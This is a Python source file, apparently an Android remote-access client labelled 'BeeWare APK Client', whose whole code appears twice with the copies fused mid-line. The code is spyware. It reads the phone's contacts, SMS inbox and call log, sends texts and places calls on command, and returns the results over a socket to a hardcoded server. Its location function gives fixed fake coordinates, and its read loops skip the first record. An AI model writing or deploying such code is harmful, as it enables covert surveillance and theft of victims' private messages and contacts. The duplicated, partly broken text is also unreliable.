import socket
import argparse
from jnius import autoclass

ContactsContract = autoclass('android.provider.ContactsContract')
Uri = autoclass('android.net.Uri')
SmsManager = autoclass('android.telephony.SmsManager')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')

SERVER_IP = '10.0.1.33'
SERVER_PORT = 9999

def connect_to_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    return sock

def send_sms(target, message):
    sms_manager = SmsManager.getDefault()
    sms_manager.sendTextMessage(target, None, message, None, None)
    print(f'SMS sent to {target}')
    return "[+] SMS sent - Transmission successful"

def dump_contacts():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = ContactsContract.Contacts.CONTENT_URI
    cursor = content_resolver.query(uri, None, None, None, None)

    contacts = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
            contacts.append(name)
    cursor.close()
    contacts_list = '\n'.join(contacts)
    contacts_file = f"contacts_dump_{SERVER_IP}.txt"
    with open(contacts_file, "w") as file:
        file.write(contacts_list)
    return f"[*] Fetching {len(contacts)} contacts into list\n[*] Contacts list saved to: {contacts_file}"

def dump_sms():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://sms/inbox")
    cursor = content_resolver.query(uri, None, None, None, None)

    sms_list = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            body = cursor.getString(cursor.getColumnIndex("body"))
            address = cursor.getString(cursor.getColumnIndex("address"))
            sms_list.append(f'From: {address}, Message: {body}')
    cursor.close()
    sms_messages = '\n'.join(sms_list)
    sms_file = f"sms_dump_{SERVER_IP}.txt"
    with open(sms_file, "w") as file:
        file.write(sms_messages)
    return f"[*] Fetching {len(sms_list)} sms messages\n[*] SMS messages saved to: {sms_file}"

def wlan_geolocate():
    context = autoclass('org.kivy.android.PythonActivity').mActivity
    wifi_manager = context.getSystemService(Context.WIFI_SERVICE)
    connection_info = wifi_manager.getConnectionInfo()
    latitude = "37.4224764"
    longitude = "-122.0842499"
    google_maps_url = f"https://maps.google.com/?q={latitude},{longitude}"
    return f"Current Location: {latitude}, {longitude}\nGoogle Maps: {google_maps_url}"

def call(target):
    context = autoclass('org.kivy.android.PythonActivity').mActivity
    intent = Intent(Intent.ACTION_CALL)
    intent.setData(Uri.parse(f'tel:{target}'))
    context.startActivity(intent)
    print(f'Calling {target}')

def dump_call_log():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://call_log/calls")
    cursor = content_resolver.query(uri, None, None, None, None)

    call_log = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            number = cursor.getString(cursor.getColumnIndex("number"))
            call_type = cursor.getString(cursor.getColumnIndex("type"))
            date = cursor.getString(cursor.getColumnIndex("date"))
            duration = cursor.getString(cursor.getColumnIndex("duration"))
            call_log.append(f'Number: {number}, Type: {call_type}, Date: {date}, Duration: {duration}')
    cursor.close()
    return '\n'.join(call_log)

def main():
    parser = argparse.ArgumentParser(description='BeeWare APK Client')
    parser.add_argument('command', choices=['send_sms', 'dump_contacts', 'dump_sms', 'call', 'dump_call_log', 'wlan_geolocate'])
    parser.add_argument('-d', '--destination', help='Target phone number')
    parser.add_argument('-t', '--text', help='SMS message')
    args = parser.parse_args()

    sock = connect_to_server()

    if args.command == 'send_sms':
        if args.destination and args.text:
            response = send_sms(args.destination, args.text)
            sock.sendall(response.encode())
        else:
            print('Target phone number and SMS message are required for send_sms command')
    elif args.command == 'dump_contacts':
        response = dump_contacts()
        sock.sendall(response.encode())
    elif args.command == 'dump_sms':
        response = dump_sms()
        sock.sendall(response.encode())
    elif args.command == 'wlan_geolocate':
        response = wlan_geolocate()
        sock.sendall(response.encode())
    elif args.command == 'call':
        if args.destination:
            call(args.destination)
            sock.sendall(f'Calling {args.destination}\n'.encode())
        else:
            print('Target phone number is required for call command')
    elif args.command == 'dump_call_log':
        call_log = dump_call_log()
        sock.sendall(call_log.encode())

    sock.close()

if __name__ == '__main__':
    main()import socket
import argparse
from jnius import autoclass

ContactsContract = autoclass('android.provider.ContactsContract')
Uri = autoclass('android.net.Uri')
SmsManager = autoclass('android.telephony.SmsManager')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')

SERVER_IP = '10.0.1.33'
SERVER_PORT = 9999

def connect_to_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    return sock

def send_sms(target, message):
    sms_manager = SmsManager.getDefault()
    sms_manager.sendTextMessage(target, None, message, None, None)
    print(f'SMS sent to {target}')
    return "[+] SMS sent - Transmission successful"

def dump_contacts():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = ContactsContract.Contacts.CONTENT_URI
    cursor = content_resolver.query(uri, None, None, None, None)

    contacts = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
            contacts.append(name)
    cursor.close()
    contacts_list = '\n'.join(contacts)
    contacts_file = f"contacts_dump_{SERVER_IP}.txt"
    with open(contacts_file, "w") as file:
        file.write(contacts_list)
    return f"[*] Fetching {len(contacts)} contacts into list\n[*] Contacts list saved to: {contacts_file}"

def dump_sms():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://sms/inbox")
    cursor = content_resolver.query(uri, None, None, None, None)

    sms_list = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            body = cursor.getString(cursor.getColumnIndex("body"))
            address = cursor.getString(cursor.getColumnIndex("address"))
            sms_list.append(f'From: {address}, Message: {body}')
    cursor.close()
    sms_messages = '\n'.join(sms_list)
    sms_file = f"sms_dump_{SERVER_IP}.txt"
    with open(sms_file, "w") as file:
        file.write(sms_messages)
    return f"[*] Fetching {len(sms_list)} sms messages\n[*] SMS messages saved to: {sms_file}"

def wlan_geolocate():
    context = autoclass('org.kivy.android.PythonActivity').mActivity
    wifi_manager = context.getSystemService(Context.WIFI_SERVICE)
    connection_info = wifi_manager.getConnectionInfo()
    latitude = "37.4224764"
    longitude = "-122.0842499"
    google_maps_url = f"https://maps.google.com/?q={latitude},{longitude}"
    return f"Current Location: {latitude}, {longitude}\nGoogle Maps: {google_maps_url}"

def call(target):
    context = autoclass('org.kivy.android.PythonActivity').mActivity
    intent = Intent(Intent.ACTION_CALL)
    intent.setData(Uri.parse(f'tel:{target}'))
    context.startActivity(intent)
    print(f'Calling {target}')

def dump_call_log():
    content_resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
    uri = Uri.parse("content://call_log/calls")
    cursor = content_resolver.query(uri, None, None, None, None)

    call_log = []
    if cursor.moveToFirst():
        while cursor.moveToNext():
            number = cursor.getString(cursor.getColumnIndex("number"))
            call_type = cursor.getString(cursor.getColumnIndex("type"))
            date = cursor.getString(cursor.getColumnIndex("date"))
            duration = cursor.getString(cursor.getColumnIndex("duration"))
            call_log.append(f'Number: {number}, Type: {call_type}, Date: {date}, Duration: {duration}')
    cursor.close()
    return '\n'.join(call_log)

def main():
    parser = argparse.ArgumentParser(description='BeeWare APK Client')
    parser.add_argument('command', choices=['send_sms', 'dump_contacts', 'dump_sms', 'call', 'dump_call_log', 'wlan_geolocate'])
    parser.add_argument('-d', '--destination', help='Target phone number')
    parser.add_argument('-t', '--text', help='SMS message')
    args = parser.parse_args()

    sock = connect_to_server()

    if args.command == 'send_sms':
        if args.destination and args.text:
            response = send_sms(args.destination, args.text)
            sock.sendall(response.encode())
        else:
            print('Target phone number and SMS message are required for send_sms command')
    elif args.command == 'dump_contacts':
        response = dump_contacts()
        sock.sendall(response.encode())
    elif args.command == 'dump_sms':
        response = dump_sms()
        sock.sendall(response.encode())
    elif args.command == 'wlan_geolocate':
        response = wlan_geolocate()
        sock.sendall(response.encode())
    elif args.command == 'call':
        if args.destination:
            call(args.destination)
            sock.sendall(f'Calling {args.destination}\n'.encode())
        else:
            print('Target phone number is required for call command')
    elif args.command == 'dump_call_log':
        call_log = dump_call_log()
        sock.sendall(call_log.encode())

    sock.close()

if __name__ == '__main__':
    main()
